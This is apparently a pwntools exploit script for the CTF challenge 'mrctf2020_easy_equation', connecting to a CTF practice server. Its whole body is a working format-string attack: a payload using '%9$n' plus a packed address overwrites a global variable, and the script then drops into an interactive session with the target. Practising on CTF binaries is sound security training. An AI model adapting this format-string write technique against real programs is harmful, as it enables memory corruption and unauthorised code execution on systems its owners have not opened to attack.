#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/21 17:19:42
@Author  :   eur1ka  
@Version :   2.7
@Contact :   raogx.vip@hotmail.com
@License :   (C)Copyright 2017-2018, Liugroup-NLPR-CASIA
@Desc    :   None
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
if debug:
    sh = process("./mrctf2020_easy_equation")
else:
    sh = remote("node3.buuoj.cn",26784)
elf = ELF("mrctf2020_easy_equation")
# libc = ELF()
payload = "aa%9$naaa"
payload += p64(0x000000000060105C)
sh.sendline(payload)
sh.interactive()